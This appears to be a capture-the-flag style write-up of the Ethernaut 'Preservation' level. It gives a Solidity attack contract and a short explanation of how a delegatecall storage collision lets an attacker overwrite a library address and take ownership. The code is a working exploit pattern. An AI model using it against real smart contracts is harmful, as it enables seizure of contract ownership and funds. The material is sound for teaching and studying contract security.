```javascript
pragma solidity ^0.6.0;

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack (address payable addr) public {
        (bool s1, ) = addr.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(address(this))));
        require(s1, "failed to set attack address.");
        (bool s2, ) = addr.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(0)));
        require(s2, "failed to modifiy owner.");
    }

    function setTime(uint time) public {
        owner = tx.origin;
    }
 
    fallback() external payable {
    }
}
```

The vulnerability here is the delegatecall in the original contract. We can modify the `timezone1Library` address to point to this contract, so the second time it delegatecalls `setTime`, it will actually change the origin ownership to `tx.origin`.
